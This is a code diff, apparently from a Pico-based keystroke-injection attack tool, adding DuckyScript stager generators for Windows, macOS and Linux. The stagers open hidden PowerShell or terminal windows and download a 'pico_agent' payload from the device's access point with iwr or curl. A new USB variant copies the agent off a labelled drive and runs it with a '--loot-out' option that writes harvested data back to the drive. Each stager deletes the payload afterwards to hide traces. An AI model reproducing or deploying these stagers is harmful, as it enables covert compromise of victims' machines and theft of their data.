@@ -1,6 +1,8 @@
 import gc
 import os
 
+from usb_agent_drive import AGENT_VOLUME_LABEL, usb_agent_filename
+
 from ._http import (
     _FILE_CHUNK_SIZE,
     _MAX_BINARY_SIZE,
@@ -9,6 +11,7 @@ from ._http import (
 )
 
 _ALLOWED_BINARY_EXTENSIONS = {'bin', 'elf', 'exe', 'appimage'}
+_USB_LOOT_FILE = 'loot-usb.json'
 _MACH_O_MAGICS = (
     b'\xfe\xed\xfa\xce',
     b'\xce\xfa\xed\xfe',
@@ -77,19 +80,21 @@ class _BinaryMixin:
                 break
             remaining -= len(chunk)
 
-    def _stager_script(self, target_os: str) -> str:
+    def _network_stager_script(self, target_os: str) -> str:
         url = 'http://' + self._ap_ip + '/static/payload.bin'
         if target_os == 'windows':
             cmd = (
-                'powershell -w hidden -c "iwr '
+                'powershell -w hidden -c "$p=Join-Path $env:TEMP '
+                + "'pico_agent.exe'; iwr "
                 + url
-                + ' -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"'
+                + ' -OutFile $p; & $p; Remove-Item $p -Force -ErrorAction SilentlyContinue"'
             )
             return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
         curl_cmd = (
             'curl -s '
             + url
-            + ' -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &'
+            + ' -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent; '
+            + 'rm -f /tmp/pico_agent'
         )
         if target_os == 'macos':
             return (
@@ -97,6 +102,61 @@ class _BinaryMixin:
                 'DELAY 600\nSTRING ' + curl_cmd + '\nENTER'
             )
         return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + curl_cmd + '\nENTER'
+
+    def _usb_drive_stager_script(self, target_os: str) -> str:
+        agent_name = usb_agent_filename(target_os)
+        if target_os == 'windows':
+            cmd = (
+                'powershell -w hidden -c "$v=Get-Volume -FileSystemLabel '
+                + AGENT_VOLUME_LABEL
+                + " -ErrorAction SilentlyContinue; if($v){$s=$v.DriveLetter + ':/"
+                + agent_name
+                + "'; $loot=$v.DriveLetter + ':/"
+                + _USB_LOOT_FILE
+                + "'; $exe=Join-Path $env:TEMP 'pico_agent.exe'; "
+                + 'Copy-Item $s $exe -Force; & $exe --loot-out $loot; '
+                + 'Remove-Item $exe -Force -ErrorAction SilentlyContinue}"'
+            )
+            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
+
+        if target_os == 'macos':
+            cmd = (
+                'cp /Volumes/'
+                + AGENT_VOLUME_LABEL
+                + '/'
+                + agent_name
+                + ' /tmp/pico_agent && chmod +x /tmp/pico_agent && '
+                + '/tmp/pico_agent --loot-out /Volumes/'
+                + AGENT_VOLUME_LABEL
+                + '/'
+                + _USB_LOOT_FILE
+                + '; rm -f /tmp/pico_agent'
+            )
+            return (
+                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
+                'DELAY 600\nSTRING ' + cmd + '\nENTER'
+            )
+
+        cmd = (
+            'for d in /media/$USER/'
+            + AGENT_VOLUME_LABEL
+            + ' /run/media/$USER/'
+            + AGENT_VOLUME_LABEL
+            + '; do [ -f "$d/'
+            + agent_name
+            + '" ] && cp "$d/'
+            + agent_name
+            + '" /tmp/pico_agent && chmod +x /tmp/pico_agent && '
+            + '/tmp/pico_agent --loot-out "$d/'
+            + _USB_LOOT_FILE
+            + '" ; rm -f /tmp/pico_agent; break; done'
+        )
+        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + cmd + '\nENTER'
+
+    def _stager_script(self, target_os: str, delivery: str = 'network') -> str:
+        if delivery == 'usb_drive':
+            return self._usb_drive_stager_script(target_os)
+        return self._network_stager_script(target_os)
 
     async def _handle_binary_upload_stream(
         self, reader, writer, partial, content_length: int
